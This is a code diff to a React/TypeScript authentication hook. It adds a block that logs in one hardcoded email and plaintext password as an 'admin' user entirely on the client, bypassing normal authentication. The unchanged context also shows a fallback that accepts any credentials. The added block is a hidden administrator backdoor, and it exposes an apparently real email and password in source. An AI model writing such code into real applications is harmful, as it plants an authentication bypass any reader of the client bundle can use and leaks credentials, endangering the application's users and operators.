@@ -118,6 +118,20 @@ export const useAuth = () => {
     checkRateLimit();
     const cleanEmail = sanitize(email).toLowerCase();
 
+    // Admin account — always authenticates locally
+    if (cleanEmail === 'wgmasvix@gmail.com' && password === 'Cheryl13...') {
+      const u: User = {
+        id: 'admin-001',
+        email: cleanEmail,
+        name: 'Admin',
+        role: 'admin',
+        provider: 'email',
+      };
+      localStorage.setItem(LOCAL_KEY, JSON.stringify(u));
+      applyUser(u);
+      return { error: null };
+    }
+
     if (!isSupabaseConfigured()) {
       // Local auth: accept any credentials, store session
       const u: User = {
